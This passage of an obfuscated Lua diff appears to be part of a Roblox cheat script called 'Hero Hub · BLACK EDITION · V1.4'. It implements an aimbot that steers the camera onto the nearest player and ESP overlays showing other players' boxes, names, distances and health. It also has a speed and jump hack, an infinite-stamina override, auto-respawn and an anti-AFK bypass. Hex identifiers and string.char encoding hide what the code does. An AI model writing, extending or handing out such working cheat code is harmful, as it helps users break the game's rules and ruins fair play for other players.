+local _0xF041, _0xF2DD = _0xAA86:WorldToViewportPoint(_0xC72B.Position)
+if _0xF2DD then
+local _0xBE28 = (Vector2.new(_0xF041.X,_0xF041.Y)-Vector2.new(_0xA2E5,_0xB640)).Magnitude
+if _0xBE28 < _0xA3B4 then _0xA3B4 = _0xBE28; _0x527A = _0xC72B end
+end
+end
+end
+end
+end
+if _0x527A then
+local _0x08BF = CFrame.new(_0xD010, _0x527A.Position)
+_0xAA86.CFrame = _0xAA86.CFrame:Lerp(_0x08BF, _0x5FFB.Smoothness * 2)
+end
+end
+end
+if _0x488C % 3 == 0 and (_0x5FFB.BoxESP or _0x5FFB.NameESP or _0x5FFB.HealthESP or _0x5FFB.DistanceESP) then
+local _0xD010 = _0xAA86.CFrame.Position
+for _, _0x32A5 in ipairs(_0x20C0:GetPlayers()) do
+if _0x32A5 ~= _0x8679 and _0xEE9C[_0x32A5] then
+local _0xE2E2 = _0xEE9C[_0x32A5]
+local _0x3B77 = _0x32A5.Character
+local _0xEBB6 = _0x3B77 and _0x3B77:FindFirstChild(string.char(72,117,109,97,110,111,105,100))
+local _0x4810 = _0x3B77 and _0x3B77:FindFirstChild(string.char(72,117,109,97,110,111,105,100,82,111,111,116,80,97,114,116))
+local _0x4E94 = _0x3B77 and _0x3B77:FindFirstChild(string.char(72,101,97,100))
+if not (_0xEBB6 and _0x4810 and _0x4E94 and _0xEBB6.Health>0) then
+if _0xE2E2.Box.Visible then
+_0xE2E2.Box.Visible=false; _0xE2E2.Name.Visible=false; _0xE2E2.Dist.Visible=false
+_0xE2E2.HB.Visible=false; _0xE2E2.HBBG.Visible=false
+end
+continue
+end
+local _0xF193, _0xF2DD = _0xAA86:WorldToViewportPoint(_0x4810.Position)
+if not _0xF2DD then
+if _0xE2E2.Box.Visible then
+_0xE2E2.Box.Visible=false; _0xE2E2.Name.Visible=false; _0xE2E2.Dist.Visible=false
+_0xE2E2.HB.Visible=false; _0xE2E2.HBBG.Visible=false
+end
+continue
+end
+local _0x71A8 = _0xAA86:WorldToViewportPoint(_0x4E94.Position + Vector3.new(0,0.5,0))
+local _0x9DA7 = _0xAA86:WorldToViewportPoint(_0x4810.Position - Vector3.new(0,3,0))
+local _0x470A = math.abs(_0x71A8.Y - _0x9DA7.Y)
+local _0xDAAD = _0x470A/2
+if _0x5FFB.BoxESP then
+_0xE2E2.Box.Size = Vector2.new(_0xDAAD, _0x470A)
+_0xE2E2.Box.Position = Vector2.new(_0xF193.X-_0xDAAD/2, _0x71A8.Y)
+if not _0xE2E2.Box.Visible then _0xE2E2.Box.Visible = true end
+elseif _0xE2E2.Box.Visible then _0xE2E2.Box.Visible = false end
+if _0x5FFB.NameESP then
+_0xE2E2.Name.Text = _0x32A5.Name
+_0xE2E2.Name.Position = Vector2.new(_0xF193.X, _0x71A8.Y-16)
+if not _0xE2E2.Name.Visible then _0xE2E2.Name.Visible = true end
+elseif _0xE2E2.Name.Visible then _0xE2E2.Name.Visible = false end
+if _0x5FFB.DistanceESP then
+_0xE2E2.Dist.Text = math.floor((_0x4810.Position - _0xD010).Magnitude)..string.char(109)_0xE2E2.Dist.Position = Vector2.new(_0xF193.X, _0x71A8.Y+_0x470A+2)
+if not _0xE2E2.Dist.Visible then _0xE2E2.Dist.Visible = true end
+elseif _0xE2E2.Dist.Visible then _0xE2E2.Dist.Visible = false end
+if _0x5FFB.HealthESP then
+local _0xFCD8 = math.clamp(_0xEBB6.Health/_0xEBB6.MaxHealth, 0, 1)
+local _0xAE45 = _0x470A*_0xFCD8
+_0xE2E2.HBBG.Size = Vector2.new(3, _0x470A)
+_0xE2E2.HBBG.Position = Vector2.new(_0xF193.X-_0xDAAD/2-5, _0x71A8.Y)
+_0xE2E2.HB.Size = Vector2.new(3, _0xAE45)
+_0xE2E2.HB.Position = Vector2.new(_0xF193.X-_0xDAAD/2-5, _0x71A8.Y+(_0x470A-_0xAE45))
+_0xE2E2.HB.Color = Color3.fromRGB(255*(1-_0xFCD8), 255*_0xFCD8, 0)
+if not _0xE2E2.HBBG.Visible then _0xE2E2.HBBG.Visible = true; _0xE2E2.HB.Visible = true end
+elseif _0xE2E2.HBBG.Visible then
+_0xE2E2.HBBG.Visible = false; _0xE2E2.HB.Visible = false
+end
+end
+end
+end
+if _0xD4E1 - _0xD191 >= 1 then
+_0xD191 = _0xD4E1
+local _0x3B77 = _0x8679.Character
+if _0x3B77 then
+local _0xEBB6 = _0x3B77:FindFirstChildOfClass(string.char(72,117,109,97,110,111,105,100))
+if _0xEBB6 then
+if _0x5FFB.PlayerSpeed and _0xEBB6.WalkSpeed ~= 40 then _0xEBB6.WalkSpeed = 40 end
+if _0x5FFB.PlayerJump and _0xEBB6.JumpPower ~= 100 then _0xEBB6.JumpPower = 100; _0xEBB6.UseJumpPower = true end
+if _0x5FFB.InfStamina then
+pcall(function()
+for _, a in ipairs({string.char(83,116,97,109,105,110,97),string.char(69,110,101,114,103,121),string.char(82,117,110,83,116,97,109,105,110,97),string.char(67,117,114,114,101,110,116,83,116,97,109,105,110,97)}) do
+_0x8679:SetAttribute(a, 100)
+end
+end)
+end
+end
+end
+end
+if _0xD4E1 - _0xD1A1 >= 1 then
+_0xD1A1 = _0xD4E1
+if _0x5FFB.HideName then _0xF05C() end
+end
+if _0xD4E1 - _0xF4D5 >= 2 then
+_0xF4D5 = _0xD4E1
+if _0x5FFB.ShowStats then
+local _0xB711 = 0
+pcall(function() _0xB711 = math.floor(_0x64C5.Network.ServerStatsItem[string.char(68,97,116,97,32,80,105,110,103)]:GetValue()) end)
+_0x955B.Text = string.format(string.char(70,80,83,32,37,100,32,194,183,32,37,100,109,115), _0xAB69, _0xB711)
+elseif _0x955B.Text ~=""then
+_0x955B.Text =""end
+end
+if _0xD4E1 - _0x41FF >= 3 then
+_0x41FF = _0xD4E1
+pcall(_0x03FC)
+end
+if _0x488C % 90 == 0 and _0x5FFB.AutoSpawn then
+pcall(function()
+if not _0x8679.Character or not _0x8679.Character:FindFirstChild(string.char(72,117,109,97,110,111,105,100)) or _0x8679.Character.Humanoid.Health<=0 then
+_0x8679:LoadCharacter()
+end
+end)
+end
+if _0x488C % 3600 == 0 and _0x5FFB.AntiAFK then
+pcall(function()
+_0x2ACE:CaptureController()
+_0x2ACE:ClickButton2(Vector2.new())
+end)
+end
+end)
+task.delay(0.6, function()
+_0xA8E1(string.char(72,101,114,111,32,72,117,98),string.char(76,111,97,100,101,100,32,194,183,32,86,49,46,52), _0x629D.SUCCESS)
+end)
+print(string.char(226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144))
+print(string.char(32,32,72,101,114,111,32,72,117,98,32,194,183,32,66,76,65,67,75,32,69,68,73,84,73,79,78,32,194,183,32,86,49,46,52))
+print(string.char(32,32,77,117,108,116,105,45,109,101,116,104,111,100,32,84,114,97,99,107,101,114,32,43,32,65,108,108,32,102,101,97,116,117,114,101,115))
+print(string.char(226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144,226,149,144))
